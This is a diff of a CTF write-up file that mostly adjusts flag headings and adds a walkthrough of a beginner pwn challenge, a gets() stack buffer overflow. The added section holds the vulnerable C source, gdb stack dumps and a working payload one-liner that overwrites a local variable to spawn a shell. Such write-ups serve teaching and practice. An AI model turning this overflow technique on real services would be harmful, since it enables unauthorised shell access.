@@ -104,7 +104,7 @@ Found. Redirecting to /?alert=flag%7Bsqli_overused_again_0b4f6%7D
 #flag{sqli_overused_again_0b4f6}
 ```
 
-#### Flag: flag{sqli_overused_again_0b4f6}
+##### Flag: flag{sqli_overused_again_0b4f6}
 
 ### web/secure
 
@@ -227,7 +227,7 @@ Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
 #flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}
 ```
 
-#### Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}
+##### Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}
 
 ### web/pastebin-1
 
@@ -293,4 +293,159 @@ Accept-Encoding: gzip, deflate, br
 
 6. The cookie is the flag itself, no need to authenticate as admin.
 
-#### Flag: flag{d1dn7_n33d_70_b3_1n_ru57}
+##### Flag: flag{d1dn7_n33d_70_b3_1n_ru57}
+
+### pwn/beginner-generic-pwn-number-0
+
+---
+
+#### Categeory: Binary Exploitation
+
+#### Difficulty: Easy
+
+#### Keywords: Buffer Overflow, Binary Exploitation
+
+#### Author: TheRealDarkCoder
+
+#### Prompt:> 
+
+```
+rob keeps making me write beginner pwn! i'll show him...
+
+nc mc.ax 31199
+
+```
+
+#### Overview:>
+
+1. We have a running service which we can connect to via netcat which is running a ELF binary. The compiled binary (`pwn/beginner-generic-pwn-number-0`) and the C source code (`beginner-generic-pwn-number-0.c`) is provided to us. Upon running the binary the file outputs 3 lines, the first being a random line each time (Taken from an array after an index is randomly generated) and then 2 hardcoded lines. Then the program asks for user input and exits after user input.
+
+2. We take a look at the source code and immidietly find the attack vectors.
+
+```c
+...
+char heartfelt_message[32];
+
+...
+
+gets(heartfelt_message);
+
+if(inspirational_message_index == -1) {
+   system("/bin/sh");
+}
+```
+
+3. This is a classic buffer overflow challenge where depreciated `gets()` is used to take user input. There seems to be an impossible conditional check which makes a system call to open a shell for us. The value of `inspirational_message_index` has to be set to `-1` for the check to pass but the value is hardcoded to be between 0 and 2 above in the source code.
+
+```c
+const char *inspirational_messages[] = {
+  "\"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\"",
+  "\"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\"",
+  "\"𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\"",
+};
+
+int main(void)
+{
+  srand(time(0));
+  long inspirational_message_index = rand() % (sizeof(inspirational_messages) / sizeof(char *));
+  ...
+```
+
+4. We run the binary with `gdb` and take a look at the assembly code.
+
+```asm
+  ...
+   0x0000000000401294 <+158>:	call   0x4010a0 <puts@plt>
+   0x0000000000401299 <+163>:	lea    rax,[rbp-0x30]
+   0x000000000040129d <+167>:	mov    rdi,rax
+   0x00000000004012a0 <+170>:	call   0x4010f0 <gets@plt>
+   0x00000000004012a5 <+175>:	cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
+   0x00000000004012aa <+180>:	jne    0x4012b8 <main+194>
+   0x00000000004012ac <+182>:	lea    rdi,[rip+0xf35]        # 0x4021e8
+   0x00000000004012b3 <+189>:	call   0x4010c0 <system@plt>
+   0x00000000004012b8 <+194>:	mov    eax,0x0
+   0x00000000004012bd <+199>:	leave  
+   0x00000000004012be <+200>:	ret
+```
+
+The above is a small ending part of `main` which we are interested in. We see that after the program outputs the 3 lines (`puts()`) the `main` calls a `gets()`. After which the pointer at `[rbp-0x8]` is compared with `0xffffffffffffffff` which is the hexadecimal of `-1`. So we can assume that `rbp-0x8` contains the address in stack which stores the random value generated at the top. If the check passes (Which naturally won't because `rand()` is hardcoding the value to be between 0 and 2) the binary runs a `system()` call to run a shell. So our target is to overflow the stack to replace the pointer stored at rbp-0x8 with `0xffffffffffffffff`.
+
+5. We set a breakpoint just before the comparison at `0x00000000004012a5`.
+
+```sh
+break *0x00000000004012a5
+```
+
+Then we run the program with a test input `AABBCCDD` and reach the breakpoint and take a look at all the registers and some stack.
+
+```asm
+AABBCCDD
+
+Breakpoint 1, 0x00000000004012a5 in main ()
+(gdb) x/wx $rbp-0x8
+0x7fffffffe368:	0x00000001
+(gdb) x/24wx $rbp
+0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
+0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
+0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
+0x7fffffffe3a0:	0x004012c0	0x00000000	0x55f78315	0x62ec878e
+0x7fffffffe3b0:	0x00401110	0x00000000	0x00000000	0x00000000
+0x7fffffffe3c0:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x/24wx $rsp
+0x7fffffffe340:	0x42424141	0x44444343	0x00401200	0x00000000
+0x7fffffffe350:	0x00000000	0x00000000	0x00401110	0x00000000
+0x7fffffffe360:	0xffffe460	0x00007fff	0x00000001	0x00000000
+0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
+0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
+0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
+```
+
+We see that our user input is at `0x7fffffffe340` and the $rbp-0x8 is at `0x7fffffffe368`. Subtract the former from the later and we get `40`. So we need exactly `40` bytes of userinput to overflow the stack and reach the address where the value of `inspirational_message_index` is kept. We use python to provide the binary with 40 `A`s and recheck the stack.
+
+```
+0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe360:	0x41414141	0x41414141	0x00000000	0x00000000
+```
+
+And indeed we have reached out target.
+
+6. Now we just need to fill the next 8 bytes with hexadecimals `ff`s.
+I chose to use python2 here because python3 has some weird print directly as binary problems which I still don't understand. I'm sure it can be done with python3 with very simple syntax change but I did in Python2 anyway. 
+
+```sh
+r <<< $(python2 -c "print(b'A'*40 + b'\xff'*8)")
+...
+0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe360:	0x41414141	0x41414141	0xffffffff	0xffffffff
+```
+
+...and sure enough, our target addresses are now filled with `ff`s, which should allow the `jne` to pass and call the systemcall. `gdb` says 
+
+```
+(gdb) c
+Continuing.
+[Detaching after vfork from child process 12200]
+[Inferior 1 (process 12156) exited normally]
+```
+
+...which means a system call has spawned in another process, in this case the shell. We try to run the python snippet on the actual binary 
+
+```sh
+(python2 -c "print(b'A'*40 + b'\xff'*8)" ; cat) | ./beginner-generic-pwn-number-0
+```
+*You have to wrap the line with parenthesis and then do this semicolon `cat` trick to get output from the shell. There are other cleaner ways to redirect the output from shell but this method works and is simple to remember.*
+
+```
+darkcoder:SOLVED_beginner-generic-pwn-number-0/ (pwn*) $ (python2 -c "print(b'A'*40 + b'\xff'*8)" ; cat) | ./beginner-generic-pwn-number-0
+"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬"
+rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
+can you write me a heartfelt message to cheer me up? :(
+whoami
+darkcoder
+```
+
+...and indeed we have a shell. Pass it to the remote server, run `ls; cat flag.txt` and the flag is ours.
+
+##### Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
